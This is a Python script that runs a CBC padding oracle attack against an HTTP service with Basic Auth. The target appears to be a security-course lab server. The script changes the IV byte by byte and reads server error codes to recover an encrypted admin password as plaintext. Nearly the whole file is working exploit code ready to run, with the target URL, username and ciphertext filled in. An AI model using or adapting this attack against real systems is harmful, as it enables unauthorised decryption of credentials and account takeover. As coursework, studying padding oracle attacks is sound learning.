import requests
import base64
import time

####Variables to set for the attack

username = "admin"
password = "8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96"

url = "http://project-2.csec.chatzi.org:8000"
requests_per_sec = 1/4

#############################


iv_string = password[0:32]
c1 = password[32:]


actual = []
new_iv = []
iv = []
for i in range(16):
	actual.append(None) 
	new_iv.append(int(iv_string[2*i:2*i + 2],16))
	iv.append(int(iv_string[2*i:2*i + 2],16))


def is_valid_padding(iv, c1):
	payl = username + ":" + iv + c1
	headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8")}
	response = requests.get(url,headers = headers)
	return (response.status_code != 500)

def array_to_hex_string(array):
	hex_string = ""
	for byte in array:
		hex_string += format(byte,'02x')
	return hex_string


# In order for find_digit(d) to work, actual[d+1:] needs to be already computed
def find_digit(d, requests_per_sec = 1, ascii_value_order = range(0,256)):
	
	num_of_requests = 0

	ascii_value_order = [i ^ (16-d) ^ iv[d] for i in ascii_value_order]
	for k in range(d+1,16):
		new_iv[k] = actual[k] ^ iv[k] ^ (16-d)

	for byte in ascii_value_order:
		if byte == iv[d]:
			continue
		new_iv[d] = byte 
		num_of_requests+=1
		if is_valid_padding(array_to_hex_string(new_iv), c1):
			actual[d] = (16-d) ^ iv[d] ^ new_iv[d]
			break
		time.sleep(1/requests_per_sec)
		

	if(actual[d] == None):
		actual[d] = 16-d
	print("Found digit ",d,": ascii value of ",actual[d])

	return num_of_requests





ascii_value_order = []
ascii_value_order += [i for i in range(97,122+1)] # a to z  
ascii_value_order += [i for i in range(48,57+1)] # 0 to 9
ascii_value_order += [i for i in range(65,90+1)] # A to Z
ascii_value_order += [i for i in range(33,47+1)] # ! " # $ % & ' ( ) * + , - . /
ascii_value_order += [i for i in range(58,64+1)] # : ; < = > ? @
ascii_value_order += [i for i in range(91,96+1)] # [ \ ] ^ _ `
ascii_value_order += [i for i in range(123,126+1)] # { | } ~

# Rest of ascii
ascii_value_order += [i for i in range(127,256)] 
ascii_value_order += [i for i in range(0,33)]


total_requests = 0

total_requests += find_digit(15, requests_per_sec = requests_per_sec)
for d in range(15,16-actual[15]-1,-1):
	actual[d] = actual[15]


for d in range(16-actual[15]-1,-1,-1):
	total_requests += find_digit(d,requests_per_sec = requests_per_sec,ascii_value_order = ascii_value_order)




plaintext_size = 16 - actual[15]
actual_string = array_to_hex_string(actual)
print("The hex string of the password is ", actual_string[:2*plaintext_size])
plaintext_bytes = bytes.fromhex(actual_string[:2*plaintext_size])
plaintext = plaintext_bytes.decode('ascii')
print("Plaintext password is: ",plaintext)
print("Total requests: ",total_requests)



